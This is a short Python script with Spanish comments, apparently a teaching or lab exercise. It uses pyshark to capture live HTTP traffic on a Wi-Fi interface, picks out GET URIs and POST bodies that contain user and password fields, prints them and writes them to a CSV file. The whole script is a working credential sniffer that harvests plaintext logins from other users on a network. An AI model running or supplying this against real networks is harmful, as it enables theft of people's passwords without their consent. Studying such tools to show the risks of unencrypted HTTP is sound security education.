# Extraer credenciales transmitidas en texto plano en tráfico HTTP.
import pyshark
import csv
INTERFAZ = 'Wi-Fi'
ARCHIVO_CSV = 'credenciales_http.csv'
credenciales_http = []
print("Iniciando captura de paquetes HTTP...\n")
captura = pyshark.LiveCapture(interface=INTERFAZ, display_filter='http')
for packet in captura.sniff_continuously(packet_count=20):
    try:
        hora = packet.sniff_time
        if hasattr(packet, 'http'): # Verifica si el paquete contiene capa HTTP
            if hasattr(packet.http, 'request_method'):
# Verifica si dentro de la capa HTTP existe el método de la petición (GET, POST, etc.)
                metodo = packet.http.request_method.upper()
# Guarda el método HTTP en mayúsculas para facilitar comparaciones
                datos = ''
# Inicializa variable para almacenar datos donde podrían estar las credenciales
                if metodo == 'POST':
                    # Si el método es POST, los datos suelen estar en el campo file_data
                    if hasattr(packet.http, 'file_data'):
                        datos = packet.http.file_data.lower()
                        # Obtiene esos datos y los pasa a minúsculas para comparar más fácil
                elif metodo == 'GET':
                    # Si el método es GET, los datos pueden estar en la URI de la petición
                    if hasattr(packet.http, 'request_uri'):
                        datos = packet.http.request_uri.lower()
                        # Obtiene la URI y la pasa a minúsculas

                if datos != '':                     # Si hay datos en esa variable...
                    if (('user=' in datos or 'username=' in datos) and ('pass=' in datos or 'password=' in datos)):
                        # Busca si esos datos contienen palabras clave comunes de usuario y contraseña
                        # Esto es una forma simple de detectar posibles credenciales en texto plano
                        credenciales_http.append([hora, metodo, datos])
                        # Si se detectan, agrega la info (hora, método, datos) a la lista
                        print("Hora:", hora, "Método:", metodo, "Datos:", datos)
                        # Imprime la información capturada por consola
    except AttributeError:
        continue
print("\nLista de credenciales HTTP capturadas:")
for cred in credenciales_http:
    print(cred)
with open(ARCHIVO_CSV, mode='w', newline='') as archivo:
    writer = csv.writer(archivo)
    writer.writerow(['Hora', 'Método HTTP', 'Datos Capturados'])
    writer.writerows(credenciales_http)
print("\nLos datos han sido guardados en '{}'.".format(ARCHIVO_CSV))
